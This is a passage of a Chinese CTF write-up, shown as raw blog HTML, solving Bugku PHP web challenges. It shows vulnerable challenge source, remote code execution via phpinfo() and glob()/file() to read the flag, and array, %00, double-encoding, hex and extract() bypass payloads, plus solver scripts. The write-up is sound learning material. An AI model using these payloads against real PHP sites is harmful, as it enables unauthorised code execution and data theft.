class="line">http://120.24.86.145:8010/index.php?s=phpinfo() 执行成功</span><br></pre></td></tr></table></figure><p>但是菜刀连不上，估计是限制了权限。<br>试了n久之后，看了wp<br>用的print_r(glob(‘*.php’));读取敏感文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; 2.php [1] =&gt; 3.php [2] =&gt; 4.php [3] =&gt; 5.php [4] =&gt; a.php [5] =&gt; c.php [6] =&gt; chaoba1.php [7] =&gt; chaoba2.php [8] =&gt; ddee.php [9] =&gt; f.php [10] =&gt; h.php [11] =&gt; haha.php [12] =&gt; index.php [13] =&gt; ll.php [14] =&gt; oudeniu.php [15] =&gt; phpspy1.php [16] =&gt; q.php [17] =&gt; t2.php [18] =&gt; txxxc.php [19] =&gt; x.php [20] =&gt; xxoo.php [21] =&gt; xxoos.php [22] =&gt; zx.php )</span><br></pre></td></tr></table></figure></p><p>尝试：print_r(glob(‘*.txt’))<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; NewFile.txt [1] =&gt; a.txt [2] =&gt; flag.txt [3] =&gt; testfile.txt )</span><br></pre></td></tr></table></figure></p><p>尝试：print_r(file(“./flag.txt”))<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; BUGKU&#123;bugku_web_009801_a&#125; )</span><br></pre></td></tr></table></figure></p><h2 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a><a href="20">前女友</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>v1和v2比：数组绕过<br>v3 strcmp()绕过：用数组即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload： http://118.89.219.210:49162/?v1[]=123&amp;v2[]=ads&amp;v3[]=123</span><br></pre></td></tr></table></figure></p><p>flag：SKCTF{Php_1s_tH3_B3St_L4NgUag3}</p><h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a><a href="21">秋名山老司机</a></h2><p><img src="https://i.loli.net/2018/06/17/5b26112ec07dc.png" alt="Alt text"><br>算术题，刷新一次变一次，多刷新几次会发现：<br><img src="https://i.loli.net/2018/06/17/5b26114844148.png" alt="Alt text"><br>让我们把答案在2秒内以value为参数post上去：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/qiumingshan/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">responce = s.get(url)</span><br><span class="line">final = re.findall(<span class="string">r'&lt;div&gt;(.+?)='</span>,responce.text)</span><br><span class="line">result = eval(final[<span class="number">0</span>])</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"value"</span>: str(result)</span><br><span class="line">&#125;</span><br><span class="line">responce2 = s.post(url,data=data)</span><br><span class="line">print(responce2.text)</span><br></pre></td></tr></table></figure></p><blockquote><p>这里有个坑：一定要开session，不然他会以为你是不同电脑发来的</p></blockquote><h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a><a href="22">速度要快</a></h2><p>抓到返回headers 里面有base64加密的flag<br>base64解密后，发现flag部分还有一次base64<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests,base64,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line">s = requests.session()</span><br><span class="line">responce = s.get(url)</span><br><span class="line">f = responce.headers[<span class="string">'flag'</span>]</span><br><span class="line">f = base64.b64decode(f)</span><br><span class="line">print(f)</span><br><span class="line">flag = re.findall(<span class="string">r':(.+?)\''</span>,str(f))[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'margin'</span>: base64.b64decode(flag)</span><br><span class="line">&#125;</span><br><span class="line">print(flag)</span><br><span class="line">responce2 = s.post(url,data=data)</span><br><span class="line">print(responce2.text)</span><br></pre></td></tr></table></figure></p><h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a><a href="41">Trim的日记本</a></h2><p>一想到这种题肯定考二次，但是扫了一下目录得到show.php，访问就拿到flag了。这个题没找到回显的点，不知道这个题是考察什么…</p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a><a href="23">变量覆盖</a></h2><p>源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">'xxx'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));</span><br><span class="line"><span class="keyword">if</span>($shiyan==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>解法1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/1.php?shiyan=123&amp;flag=php://input</span><br><span class="line">post_data:123</span><br></pre></td></tr></table></figure></p><p>解法2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/1.php?shiyan=&amp;flag=</span><br></pre></td></tr></table></figure></p><p>flag{bugku-dmsj-p2sm3N}<br>但是为什么赋1就不相等呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/1.php?shiyan=1&amp;flag=1</span><br></pre></td></tr></table></figure></p><p>后来在本地测了一下，因为file_get_contents($flag)始终是包含不到文件的，所以会返回一个空，此时只有当shiyan参数也为空才能相等。<br>demo:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">'123'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($flag1));</span><br><span class="line">    <span class="keyword">if</span>($shiyan==$content)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'bingo'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        var_dump($flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        var_dump($content);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        var_dump($shiyan);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        var_dump($flag.<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">        var_dump($content.<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">        var_dump($shiyan.<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">        <span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a><a href="6">strcmp比较字符串</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span></span><br><span class="line"><span class="comment">//比较两个字符串（区分大小写）</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'No'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>数组绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/6.php?a[]=1</span><br></pre></td></tr></table></figure></p><p>Flag: flag{bugku_dmsj_912k}</p><h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a><a href="25">urldecode二次编码绕过</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">not allowed!</span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Access granted!</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为浏览器解析一次php解析一次，所以要两次编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61</span><br></pre></td></tr></table></figure></p><p>flag{bugku__daimasj-1t2} </p><h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a><a href="26">数组返回NULL绕过</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ereg()函数匹配数组的时候会返回null，所以：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/19.php?password[]=1--</span><br></pre></td></tr></table></figure></p><p>flag{ctf-bugku-ad-2131212}</p><h2 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a><a href="35">弱类型整数大小比较绕过</a></h2><p>题示源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line">is_numeric($temp)?<span class="keyword">die</span>(<span class="string">"no numeric"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure></p><p>要求我们传入的password参数不能为数字，且要大于1336。<br>我们可以在本地测试一下，is_numeric()函数可以被数组绕过，而且该数组可以和数字进行大小比较：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$temp = $_POST[<span class="string">'passer6y'</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($temp)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"is num&lt;br&gt;"</span>;</span><br><span class="line">    var_dump($temp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"is not num&lt;br&gt;"</span>;</span><br><span class="line">    var_dump($temp);</span><br><span class="line">    <span class="keyword">if</span>($temp &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;\$temp &gt; 10"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/06/17/5b26118276dd2.png" alt="Alt text"><br>所以我们可以，构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/22.php?password[]=asdsadsadasd</span><br></pre></td></tr></table></figure></p><p>得到flag：flag{bugku_null_numeric}</p><h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a><a href="36">sha()函数比较绕过</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">var_dump($_GET[<span class="string">'password'</span>]);</span><br><span class="line">var_dump(sha1($_GET[<span class="string">'name'</span>]));</span><br><span class="line">var_dump(sha1($_GET[<span class="string">'password'</span>]));</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your password can not be your name!'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'ogin first!'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个题目要求我们传入name和password参数不相等，但他们的sha1()加密后相等<br>我们可以本地测试一下如果sha1()函数加密一个数组返回的会是怎样：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_POST[<span class="string">'passer6y'</span>];</span><br><span class="line">var_dump(sha1($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/06/17/5b2611a17ded5.png" alt="Alt text"><br>会发出一个警告，说sha1()希望参数是string类型，但如果我们传入一个数组类型，返回的是NULL，因此此题我们可以构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/7.php?name[]=123&amp;password[]=a</span><br></pre></td></tr></table></figure></p><p>得到：flag{bugku–daimasj-a2}</p><blockquote><p>ps：sha1()和md5()处理数组的返回都是Null，所以都可以用数组来绕过 </p></blockquote><h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a><a href="37">十六进制与数字比较</a></h2><p>题示源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($temp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">$one = ord(<span class="string">'1'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$nine = ord(<span class="string">'9'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$number = <span class="string">'3735929054'</span>;</span><br><span class="line"><span class="comment">// Check all the input characters!</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Disallow all the digits!</span></span><br><span class="line">$digit = ord($temp&#123;$i&#125;);</span><br><span class="line"><span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Aha, digit not allowed!</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"flase"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($number == $temp)</span><br><span class="line"><span class="keyword">return</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> noother_says_correct($temp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这个题的意思就是说，不能输入1-9的数字，但是最后结果是要和 ‘3735929054’相等，<br>很容易想到用16进制绕过。<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/20.php?password=0xDEADC0DE</span><br></pre></td></tr></table></figure></p><h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a><a href="38">ereg正则%00截断</a></h2><p>题示源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"xxx"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You password must be alphanumeri'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'-'</span>) !== <span class="keyword">FALSE</span>) <span class="comment">//strpos — 查找字符串首次出现的位置</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'- have not been found'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> ’Invalid password<span class="string">';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这个题要求我们传入的password变量，绕过ereg()变量，长度小于8且数值大于9999999，还要有”-“符号。<br>我们可以用%00来绕过ereg()变量，用数组绕过strlen()来限制我们的数字位数,paylaod如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/5.php?password[]=%00999999999-</span><br></pre></td></tr></table></figure></p><p>get flag：flag{bugku-dm-sj-a12JH8}<br>我在本地测数组绕过strlen()的长度限制,不论我传入的数组是什么值，都显示长度为5：<br><img src="https://i.loli.net/2018/06/17/5b2611c2118de.png" alt="Alt text"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_POST[<span class="string">'passer6y'</span>];</span><br><span class="line">var_dump(strlen($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a><a href="39">strpos数组绕过</a></h2><p>题示源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'ctf'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'ctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'ctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span 